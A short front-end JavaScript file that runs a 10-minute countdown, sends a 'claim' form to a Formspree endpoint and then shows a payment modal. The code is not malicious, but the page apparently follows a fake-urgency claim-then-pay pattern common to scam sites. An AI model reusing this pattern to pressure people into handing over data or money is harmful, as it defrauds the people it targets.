function openForm() {
  document.getElementById('formModal').style.display = 'flex';
}
function closeModals() {
  document.getElementById('formModal').style.display = 'none';
  document.getElementById('paymentModal').style.display = 'none';
}

let timeLeft = 600;
function updateTimer() {
  const countdown = document.getElementById("countdown");
  const mins = Math.floor(timeLeft / 60);
  const secs = timeLeft % 60;
  countdown.textContent = `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
  if (timeLeft > 0) {
    timeLeft--;
    setTimeout(updateTimer, 1000);
  }
}
updateTimer();

function showPayment() {
  setTimeout(() => {
    closeModals();
    document.getElementById('paymentModal').style.display = 'flex';
  }, 1500);
  return true;
}

// Formspree AJAX submission
document.getElementById('claim-form').addEventListener('submit', function(e) {
  e.preventDefault();

  const form = e.target;
  const data = new FormData(form);

  fetch("https://formspree.io/f/mqaqpkqo", {
    method: "POST",
    body: data,
    headers: {
      'Accept': 'application/json'
    }
  }).then(response => {
    if (response.ok) {
      closeModals();
      document.getElementById('paymentModal').style.display = 'flex';
    } else {
      alert("Submission failed. Please try again.");
    }
  }).catch(error => {
    alert("Something went wrong.");
  });
});

